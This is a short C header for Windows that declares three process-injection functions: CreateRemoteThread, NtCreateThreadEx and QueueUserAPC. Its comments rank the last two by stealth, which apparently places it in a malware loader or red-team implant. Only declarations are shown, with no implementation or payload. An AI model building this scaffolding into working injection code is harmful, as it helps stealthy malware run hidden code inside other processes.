#ifndef PROCESS_INJECTION_H
#define PROCESS_INJECTION_H

#include <windows.h>
#include "dynamic_api.h"

// Method 1: Standard CreateRemoteThread injection
BOOL inject_with_create_remote_thread(HANDLE processHandle, LPVOID remoteBuffer, API_POINTERS* apis);

// Method 2: NtCreateThreadEx injection (more stealthy)
BOOL inject_with_nt_create_thread_ex(HANDLE processHandle, LPVOID remoteBuffer, API_POINTERS* apis);

// Method 3: QueueUserAPC injection (even more stealthy)
BOOL inject_with_queue_user_apc(HANDLE processHandle, LPVOID remoteBuffer, API_POINTERS* apis);

#endif // PROCESS_INJECTION_H 